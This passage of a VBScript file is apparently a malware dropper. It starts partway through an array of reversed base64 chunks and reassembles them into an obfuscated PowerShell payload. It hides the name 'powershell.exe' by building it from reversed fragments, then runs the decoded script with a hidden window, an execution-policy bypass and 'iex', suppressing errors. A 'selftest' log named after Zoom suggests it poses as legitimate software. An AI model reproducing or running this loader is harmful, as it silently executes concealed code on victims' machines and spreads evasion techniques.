    "ukHdpJXdjV2Uu0WZ0NXeTdCLnwGbk5SZy92Qu0WZ0NXeTdCL", _
    "hVkcvZEI8BSKnwGbk5CcyFGaTNkL0Z2bz9mcjlWTnwyJsxGZ", _
    "yVmZlJlLwNGJdRWavZ3WgACIgACIgAiCNsHI0NWZqJ2Ttg2Y", _
    "gACIgoQD9BCIgAiCNkyXkgCZkFkLzVWasJWblN3cBRWZj5WZ", _
    "oN1QuQnZvN3byNWaNBCdjVmai9UL3VmTg0DIyVGZpZ3byBHJ", _
    "gQHb1NXZyRCIgACIK0gclRWa29mcQVGZvNEcyFGaTNkLwJXY", _
    "jJXdvNVbvJnR5xmYtV2czFUZslGct92QuIXZklmdvJHckASP", _
    "yJXRuQHb1NXZyRCKgYWagACIgoQDpU2YyV3bzRCIsA3YkgSZ", _
    "g0DI0hXZ0RCIgACIgACIgoQD7BSKwACdn1CI05WdvNkLzJ3b", _
    "F5CdsV3clJHJg4WagUGJoACajFWZy9mZgACIgACIgAiCNcyJ", _
    "gJCIrASKocmbpJHdT9GVuUGJg0zKgQHelRHJgsHIpMncvJnc", _
    "UxGbBVGdpJ3V6oTXlxWaG5yTJtFIgACIgACIgoQD9BiIuBmc", _
    "yV2dvBXLt92b6dCIQ1URUpjduVGJggGdhBVLul2bKhCK0hXZ", _
    "NIDI0lGelBCIgACIgACIK0QK0hXZ0RCIskyJn9GbuwGblh2c", _
    "kVGbpBXbvNkL0xWdzVmckASPgUGc5RHJgACIgoQD9BCIgAiC", _
    "gACIgoQDpciclRWYvxUbv9mWngSZwlHV0V2RukHbi1WZzNXQ", _
    "goQDpcibpFWTngCZvhGdl1EdldkLlBXe0RCI9ACZvhGdl1GJ", _
    "bhCImlGIgACIK0QRE9UTf10TPplO25WZkASPgUGZv1GJgACI", _
    "v1GJgsHIpkSZk9WbkgSe0BXbFJ3TsxWdONXS6oTXn5WayR3c", _
    "g0DIzdmcBV2avZnbpRCIgACIK0QfgcCbsFGdz5WanASPgUGZ", _
    "lt2b25WakACIgAiCNEDIn01W0NWZqJ2bnACdjVmai9UL3VmT", _
    "jRCIgACIK0QKlR2btRCKA1VXbdmbpJHdztFI9ASXws1cnJXQ", _
    "BV2avZnbpRCIswGb15GJoU2avZnbJ5CZvhGdl1GJg0DIlR2b", _
    "7BCajRXYjBSfK0QZk92Yk0Fdul2WgQXa4VGIgACIK0QKzdmc", _
    "0lmcXpjOdVGbpZkLPl0WgACIgACIgAiCNsHI5JHdgACIgoQD", _
    "t02bvp3JgAVTFRlO25WZkACa0FGUt4WavpEKoQHelRFbsFUZ", _
    "gAiCNkSKocmbpJHdT9GVu8FJgwSKnc2bs5CbsVGazJXZ39Gc", _
    "9pQDxACdphXZgACIgoQD9tHIoNGdhNGI9BCI" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
